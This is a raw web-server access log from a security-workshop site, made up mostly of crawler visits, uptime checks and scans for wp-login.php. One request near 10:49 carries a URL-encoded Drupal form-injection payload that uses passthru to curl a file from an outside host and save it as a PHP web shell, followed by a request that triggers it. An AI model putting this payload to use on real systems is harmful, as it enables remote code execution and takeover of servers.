77.88.47.40 - - [27/Apr/2018:10:37:54 -0400] "GET /node/18 HTTP/1.1" 200 6492 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
106.203.8.112 - - [27/Apr/2018:10:38:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
106.203.8.112 - - [27/Apr/2018:10:38:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:10:38:18 -0400] "GET /2006/local.shtml HTTP/1.1" 200 4881 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:10:38:45 -0400] "GET /papers/2001/?C=S;O=D HTTP/1.1" 200 4410 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [27/Apr/2018:10:38:58 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 200 712024 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:10:39:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [27/Apr/2018:10:39:42 -0400] "GET /proceedings/2007 HTTP/1.1" 200 6871 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:10:39:44 -0400] "GET /2006/?C=M;O=A HTTP/1.1" 200 1954 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [27/Apr/2018:10:40:03 -0400] "GET /2009/proceedings/1996/nspw1996-wulf.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:10:41:02 -0400] "GET /2009/oc.shtml HTTP/1.1" 200 5563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:10:41:08 -0400] "GET /papers/1993/nspw1993-hosmer.pdf HTTP/1.1" 200 1025715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
49.244.244.46 - - [27/Apr/2018:10:41:16 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.244.244.46 - - [27/Apr/2018:10:41:17 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.196.87.138 - - [27/Apr/2018:10:41:47 -0400] "GET /robots.txt HTTP/1.1" 200 4297 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
66.249.73.91 - - [27/Apr/2018:10:42:13 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
221.219.205.65 - - [27/Apr/2018:10:42:50 -0400] "GET /favicon.ico HTTP/1.1" 404 4142 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 LBBROWSER"
66.249.73.87 - - [27/Apr/2018:10:43:18 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 200 682818 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.89.163.193 - - [27/Apr/2018:10:44:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.89.163.193 - - [27/Apr/2018:10:44:06 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [27/Apr/2018:10:44:22 -0400] "GET /papers/1998/nspw1998-beaver.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:10:44:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.46.13.144 - - [27/Apr/2018:10:44:50 -0400] "GET /proceedings/2013 HTTP/1.1" 200 7577 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 4265 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 5547 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 3986 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 4825 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 544 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 450 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1007 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 417 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 716 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:51 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5315 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.190.56 - - [27/Apr/2018:10:44:52 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7317 "https://www.nspw.org/proceedings/2013" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
66.249.73.89 - - [27/Apr/2018:10:45:27 -0400] "GET /2017/dates HTTP/1.1" 200 6441 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
39.55.238.66 - - [27/Apr/2018:10:45:42 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
39.55.238.66 - - [27/Apr/2018:10:45:45 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [27/Apr/2018:10:46:33 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 512250 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.10 - - [27/Apr/2018:10:46:58 -0400] "GET /papers/2006/nspw2006-crawford.pdf HTTP/1.1" 200 401254 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [27/Apr/2018:10:47:37 -0400] "GET /papers/2004/nspw2004-allwein.pdf HTTP/1.1" 200 275009 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:10:48:09 -0400] "GET /current/index.shtml HTTP/1.1" 404 8012 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.108.88.42 - - [27/Apr/2018:10:48:19 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.108.88.42 - - [27/Apr/2018:10:48:23 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [27/Apr/2018:10:48:42 -0400] "GET /2017/program HTTP/1.1" 200 7339 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.121.113.106 - - [27/Apr/2018:10:49:09 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
91.121.113.106 - - [27/Apr/2018:10:49:10 -0400] "GET /?name%5B%23markup%5D=curl+http%3A%2F%2F91.121.113.106%2F5tgkc17nk6hlu88y+-o+sites%2Fall%2F4432c2610e43b5822a92d211c288de7e.php+%26%26+echo+-n+j52qvmxiag1pv2ca+%7C+md5sum&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword HTTP/1.1" 200 5934 "http://nspw.org/?name%5B%23markup%5D=curl+http%3A%2F%2F91.121.113.106%2F5tgkc17nk6hlu88y+-o+sites%2Fall%2F4432c2610e43b5822a92d211c288de7e.php+%26%26+echo+-n+j52qvmxiag1pv2ca+%7C+md5sum&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
91.121.113.106 - - [27/Apr/2018:10:49:11 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-MZOmfDeJ6QgY73YSZysJJzSSHbYI-1HiIaGYGQxliRk HTTP/1.1" 200 4053 "http://nspw.org/?q=file%2Fajax%2Fname%2F%23value%2Fform-MZOmfDeJ6QgY73YSZysJJzSSHbYI-1HiIaGYGQxliRk" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
69.162.124.227 - - [27/Apr/2018:10:49:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.149 - - [27/Apr/2018:10:47:25 -0400] "GET /papers/2005/nspw2005-thorpe.pdf HTTP/1.1" 200 3949567 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [27/Apr/2018:10:49:47 -0400] "GET /papers/2012/docs/p1.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.24 - - [27/Apr/2018:10:49:58 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 200 420013 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
46.185.180.16 - - [27/Apr/2018:10:50:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
46.185.180.16 - - [27/Apr/2018:10:50:51 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [27/Apr/2018:10:50:52 -0400] "GET /papers/1999/nspw1999-jonsson.pdf HTTP/1.1" 200 774419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:10:51:56 -0400] "GET /2016/cfp HTTP/1.1" 200 8560 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.23 - - [27/Apr/2018:10:51:58 -0400] "GET /papers/1996/?C=S;O=D HTTP/1.1" 200 8163 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [27/Apr/2018:10:53:02 -0400] "GET /papers/2011/nspw2011-locasto.pdf HTTP/1.1" 200 555120 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.30 - - [27/Apr/2018:10:53:58 -0400] "GET /2005/NSPWtrans.gif HTTP/1.1" 200 12310 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [27/Apr/2018:10:54:07 -0400] "GET /2005/cfp/latex/toplas.pdf HTTP/1.1" 200 364957 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:10:54:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.6 - - [27/Apr/2018:10:54:58 -0400] "GET /2002/final_cisc_logo.jpg HTTP/1.1" 200 11327 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
190.115.152.134 - - [27/Apr/2018:10:55:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.115.152.134 - - [27/Apr/2018:10:55:54 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.149 - - [27/Apr/2018:10:55:58 -0400] "GET /papers/1993/nspw1993-slack.pdf HTTP/1.1" 200 519834 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
122.177.59.106 - - [27/Apr/2018:10:56:08 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
122.177.59.106 - - [27/Apr/2018:10:56:10 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [27/Apr/2018:10:56:17 -0400] "GET /papers/2013/nspw2013-durmuth.pdf HTTP/1.1" 200 451673 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.30 - - [27/Apr/2018:10:56:58 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 200 458501 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [27/Apr/2018:10:57:21 -0400] "GET /papers/1997/nspw1997-mambo.pdf HTTP/1.1" 200 1056899 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.26.92.74 - - [27/Apr/2018:10:57:48 -0400] "GET /robots.txt HTTP/1.1" 200 5994 "-" "GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)"
180.76.15.18 - - [27/Apr/2018:10:57:58 -0400] "GET /2000/dates.html HTTP/1.1" 200 6564 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [27/Apr/2018:10:58:26 -0400] "GET /papers/1993/nspw1993-schaefer.pdf HTTP/1.1" 200 659850 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:10:59:31 -0400] "GET /papers/2011/nspw2011-friedland.pdf HTTP/1.1" 200 437587 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:10:59:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:11:00:35 -0400] "GET /2009/proceedings/1996/nspw1996-nelson.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.160 - - [27/Apr/2018:11:00:58 -0400] "GET /2009/proceedings/2000/?C=D;O=D HTTP/1.1" 200 7749 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
125.209.235.169 - - [27/Apr/2018:11:01:15 -0400] "GET /2012/dates HTTP/1.1" 200 6626 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.89 - - [27/Apr/2018:11:01:40 -0400] "GET /proceedings/2002 HTTP/1.1" 200 6123 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:02:45 -0400] "GET /proceedings/2004 HTTP/1.1" 200 6127 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:03:50 -0400] "GET /2002/cfp.shtml HTTP/1.1" 200 6341 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:04:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:11:04:55 -0400] "GET /papers/1993/nspw1993-yazdanian.pdf HTTP/1.1" 200 558534 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:06:00 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 200 398465 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:11:06:32 -0400] "GET /2009/proceedings/1999/?C=N;O=D HTTP/1.1" 200 4391 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:06:59 -0400] "GET /2009/proceedings/1999/?C=M;O=A HTTP/1.1" 200 4397 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [27/Apr/2018:11:07:05 -0400] "GET /papers/2001/nspw2001-raskin.pdf HTTP/1.1" 200 512638 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:11:07:33 -0400] "GET /2005/past.content HTTP/1.1" 200 5387 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:07:48 -0400] "GET /proceedings/2001 HTTP/1.1" 200 6156 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
41.234.240.85 - - [27/Apr/2018:11:08:05 -0400] "GET /wp-login.php HTTP/1.1" 404 8176 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.234.240.85 - - [27/Apr/2018:11:08:07 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [27/Apr/2018:11:08:10 -0400] "GET /papers/1993/nspw1993-denning.pdf HTTP/1.1" 200 636354 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:09:15 -0400] "GET /papers/2003/nspw2003-mchugh.pdf HTTP/1.1" 200 765834 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:11:09:32 -0400] "GET /papers/2007/?C=S;O=A HTTP/1.1" 200 4358 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:09:37 -0400] "GET /2008/program.shtml HTTP/1.1" 200 4993 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [27/Apr/2018:11:09:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [27/Apr/2018:11:10:19 -0400] "GET /papers/2012/docs/p77.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:11:24 -0400] "GET /papers/2009/nspw2009-misra.pdf HTTP/1.1" 200 432755 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:12:29 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 740529 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
86.123.166.182 - - [27/Apr/2018:11:12:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.123.166.182 - - [27/Apr/2018:11:12:49 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [27/Apr/2018:11:13:34 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 4280145 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:14:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:11:14:39 -0400] "GET /papers/2012/docs/p15.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:15:44 -0400] "GET /papers/2013/nspw2013-castro.pdf HTTP/1.1" 200 347010 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:16:49 -0400] "GET /papers/1998/nspw1998-foley.pdf HTTP/1.1" 200 652888 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:17:54 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 596849 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:18:59 -0400] "GET /papers/2005/nspw2005-locasto.pdf HTTP/1.1" 200 2008772 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:19:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
94.197.121.98 - - [27/Apr/2018:11:19:48 -0400] "GET /2013/cfp HTTP/1.1" 200 8619 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1"
94.197.121.98 - - [27/Apr/2018:11:19:49 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:49 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:49 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:49 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:50 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:50 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:50 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:50 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:50 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
94.197.121.98 - - [27/Apr/2018:11:19:51 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
66.249.73.89 - - [27/Apr/2018:11:20:03 -0400] "GET /papers/2012/docs/p67.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
223.218.104.68 - - [27/Apr/2018:11:20:26 -0400] "GET / HTTP/1.1" 200 6623 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.87 - - [27/Apr/2018:11:20:42 -0400] "GET /2004/program.shtml HTTP/1.1" 200 6713 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.149 - - [27/Apr/2018:11:20:43 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189669 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [27/Apr/2018:11:21:08 -0400] "GET /papers/2010/nspw2010-faily.pdf HTTP/1.1" 200 539853 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:22:13 -0400] "GET /1999/photos.html HTTP/1.1" 304 3603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:23:18 -0400] "GET /cfp/nspw2017-cfp.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
160.19.196.1 - - [27/Apr/2018:11:23:42 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
160.19.196.1 - - [27/Apr/2018:11:23:45 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
